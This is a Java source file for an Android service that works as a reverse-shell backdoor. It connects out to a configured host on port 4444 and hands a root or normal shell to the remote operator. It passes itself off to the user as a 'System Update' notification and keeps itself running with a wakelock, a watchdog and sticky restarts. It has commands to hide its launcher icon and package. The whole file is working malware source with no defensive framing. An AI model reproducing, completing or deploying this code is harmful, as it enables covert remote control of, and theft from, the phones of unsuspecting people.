package com.sys.core;

import android.app.*;
import android.content.*;
import android.os.*;
import java.io.*;
import java.net.*;

public class ShellService extends Service {
    static final String HOST = "0.0.0.0";
    static final int PORT = 4444;

    private volatile boolean run = true;
    private PowerManager.WakeLock wl;
    private Process proc;

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public int onStartCommand(Intent i, int f, int id) {
        startFg();
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "rs:shell");
        wl.setReferenceCounted(false);
        wl.acquire();
        run = true;
        new Thread(new Runnable() { public void run() { loop(); } }).start();
        return START_STICKY;
    }

    @Override public void onTaskRemoved(Intent root) {
        Watchdog.schedule(this);
        super.onTaskRemoved(root);
    }

    private void startFg() {
        String ch = "rs";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            NotificationChannel c = new NotificationChannel(ch, "svc", NotificationManager.IMPORTANCE_LOW);
            c.setShowBadge(false);
            nm.createNotificationChannel(c);
        }
        Notification n = new Notification.Builder(this, ch)
            .setContentTitle("System Update")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build();
        startForeground(1337, n);
    }

    private void loop() {
        while (run) {
            Socket s = null;
            try {
                s = new Socket();
                s.connect(new InetSocketAddress(HOST, PORT), 15000);
                s.setKeepAlive(true);
                proc = shell();
                final Socket sk = s;
                Thread a = pump(proc.getInputStream(), sk.getOutputStream());
                Thread b = pumpCmds(sk.getInputStream(), proc.getOutputStream(), sk.getOutputStream());
                a.join(); b.join();
            } catch (Exception ignored) {
            } finally {
                kill(); close(s);
                try { Thread.sleep(5000 + (long) (Math.random() * 7000)); } catch (Exception ignored) {}
            }
        }
    }

    private Process shell() throws IOException {
        if (new File("/system/bin/su").exists() || new File("/system/xbin/su").exists())
            try { return new ProcessBuilder("su").redirectErrorStream(true).start(); } catch (Exception ignored) {}
        return new ProcessBuilder("/system/bin/sh").redirectErrorStream(true).start();
    }

    private Thread pump(final InputStream in, final OutputStream out) {
        Thread t = new Thread(new Runnable() { public void run() {
            byte[] b = new byte[4096]; int n;
            try { while ((n = in.read(b)) > 0) { out.write(b, 0, n); out.flush(); } } catch (Exception ignored) {}
        }});
        t.start(); return t;
    }

    private Thread pumpCmds(final InputStream in, final OutputStream shIn, final OutputStream sockOut) {
        Thread t = new Thread(new Runnable() { public void run() {
            try {
                BufferedReader r = new BufferedReader(new InputStreamReader(in));
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.startsWith("!")) { builtin(line.trim(), sockOut); continue; }
                    shIn.write((line + "\n").getBytes()); shIn.flush();
                }
            } catch (Exception ignored) {}
        }});
        t.start(); return t;
    }

    private void builtin(String cmd, OutputStream out) throws IOException {
        String r = "";
        try {
            if (cmd.equals("!hide"))        { new MainActivity().hashCode(); hide(); r = "launcher oculto"; }
            else if (cmd.equals("!unhide")) { MainActivity.unhideSelf(this); r = "launcher visivel"; }
            else if (cmd.equals("!path"))   { r = getPackageCodePath(); }
            else if (cmd.equals("!hidepkg")){ r = exec("pm hide " + getPackageName()); }
            else if (cmd.equals("!unhidepkg")){ r = exec("pm unhide " + getPackageName()); }
            else if (cmd.equals("!persist")){ Watchdog.schedule(this); MainActivity.startServiceCompat(this); r = "agendado"; }
            else r = "desconhecido";
        } catch (Exception e) { r = "erro: " + e; }
        out.write((r + "\n").getBytes()); out.flush();
    }

    private void hide() {
        getPackageManager().setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP);
    }

    private String exec(String c) {
        try {
            Process p = new ProcessBuilder("/system/bin/sh", "-c", c).redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l = r.readLine()) != null) sb.append(l).append('\n');
            return sb.toString().trim();
        } catch (Exception e) { return "erro"; }
    }

    private void kill() { try { if (proc != null) proc.destroy(); } catch (Exception ignored) {} proc = null; }
    private void close(Socket s) { try { if (s != null) s.close(); } catch (Exception ignored) {} }
}